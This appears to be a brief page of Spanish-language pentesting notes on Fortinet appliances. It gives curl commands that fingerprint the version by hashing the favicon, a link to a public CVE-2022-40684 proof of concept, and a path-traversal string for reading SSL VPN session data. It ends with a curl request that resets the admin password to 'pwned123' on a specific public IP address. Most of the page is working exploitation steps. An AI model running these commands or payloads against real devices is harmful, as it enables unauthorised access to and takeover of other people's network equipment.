---
layout: default
title: Fortinet
---


```bash
curl -k https://fortinet/favicon.ico -o favicon.ico
curl -k https://fortinet/favicon/favicon.ico -o favicon.ico
md5sum favicon.ico
```

Se lo pasas a chat gpt y te dice la versión

[GitHub - horizon3ai/CVE-2022-40684: A proof of concept exploit for CVE-2022-40684 affecting Fortinet FortiOS, FortiProxy, and FortiSwitchManager](https://github.com/horizon3ai/CVE-2022-40684)

remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession

```bash
curl -X POST https://31.121.39.18:445/change_pass -k   -H "Content-Type: application/json"   -d '{
    "username": "admin",
    "newpass": "pwned123",
    "confirm": "pwned123"
  }'
```
